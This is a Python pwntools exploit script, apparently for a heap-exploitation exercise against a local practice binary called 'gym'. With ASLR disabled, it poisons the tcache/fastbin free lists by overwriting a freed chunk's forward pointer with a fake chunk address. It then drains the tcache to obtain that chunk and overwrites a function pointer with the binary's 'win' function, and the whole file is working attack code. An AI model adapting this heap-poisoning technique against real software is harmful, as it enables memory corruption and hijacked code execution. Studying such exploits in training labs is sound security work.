#!/usr/bin/python3
# ./attack.py GDB or ./attack.py
# To disable ASLR, run this first: setarch `uname -m` -R /bin/bash

from pwn import process, gdb, args, p64, ELF, context

binary = './gym'

gs = """
break main
continue
"""

e = ELF(binary)

context.aslr = False

END_OF_MENU = "e.g, l\n"


def malloc(p, size=8):
    p.sendline(b"m %d" % size)
    print("m %d" % size)
    print(p.recvuntil(END_OF_MENU).decode())


def free(p, index):
    p.sendline(b"f %d" % index)
    print("free")
    print(p.recvuntil(END_OF_MENU).decode())


def edit(p, index, content):
    p.sendline(b"e %d %b" % (index, content))
    print(b"e %d %b" % (index, content))
    print(p.recvuntil(END_OF_MENU).decode())


def exit(p):
    p.sendline(b"0")


def list_ptr(p):
    p.sendline(b"l")
    print(p.recvuntil(END_OF_MENU).decode())


def get_smallbin(p, base):
    for _ in range(8):
        malloc(p, 0x90)

    for i in range(8):
        free(p, i + base)


def launch_attack(p):
    # 0. set up a scenario with both tcache bin chunks and fastbin chunks

    # the number of chunks has to be greater than 7.
    for _ in range(10):
        malloc(p, 0x20)   # index: 0-9

    for i in range(10):
        free(p, i)

    # 1. pick up a fake chunk

    victim_memory = 0x00007ffff7dcfc30

    fake_chunk_addr = victim_memory - 0x10

    # 2. link the fake chunk to fastbin

    edit(p, 7, p64(fake_chunk_addr))

    # 3. emptify tcache bin

    for _ in range(7):
        malloc(p, 0x20)  # index: 10 - 16

    # 4. malloc from fastbin so that fastbin will refill tcache bin

    malloc(p, 0x20)  # index: 17

    # 5. malloc until we get the fake chunk

    malloc(p, 0x20)  # index: 18

    # 6. overwrite the victim address with the target winning function

    edit(p, 18, p64(e.symbols.win))

    # 7. trigger the winning function by calling the overwritten function
    # pointer

    p.interactive()


def main():
    if args.GDB:
        p = gdb.debug(binary, gdbscript=gs)
    else:
        p = process(binary, aslr=False)

    p.recvuntil(END_OF_MENU)
    launch_attack(p)

    # Make sure that this is kept for gdb
    # p.interactive()


if __name__ == "__main__":
    main()
